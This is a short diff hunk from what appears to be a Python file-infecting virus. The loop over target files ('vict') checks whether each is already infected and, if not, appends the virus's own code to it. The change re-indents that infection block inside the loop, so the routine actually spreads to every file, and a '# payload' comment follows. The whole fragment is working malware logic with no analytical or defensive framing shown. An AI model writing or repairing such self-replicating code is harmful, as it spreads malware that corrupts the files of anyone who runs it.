@@ -35,13 +35,13 @@ for p in vict:
             infected = True
             break
 
-if not infected:
-    newCode = []
-    newCode = programCode
-    newCode.extend(vCode)
-    file = open(p, 'w')
-    file.writelines(newCode)
-    file.close()
+    if not infected:
+        newCode = []
+        newCode = programCode
+        newCode.extend(vCode)
+        file = open(p, 'w')
+        file.writelines(newCode)
+        file.close()
 
     # payload
 
